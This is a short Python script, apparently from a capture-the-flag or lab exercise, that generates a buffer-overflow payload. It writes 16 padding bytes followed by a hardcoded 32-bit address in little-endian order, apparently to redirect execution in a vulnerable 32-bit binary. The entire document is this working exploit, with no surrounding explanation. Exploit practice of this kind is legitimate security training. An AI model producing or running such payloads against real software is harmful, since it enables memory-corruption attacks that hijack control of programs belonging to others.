import sys
offset = 16
target_addr = 0x0804a123
user_input = b"a" * offset
user_input += target_addr.to_bytes(4, "little")
sys.stdout.buffer.write(user_input)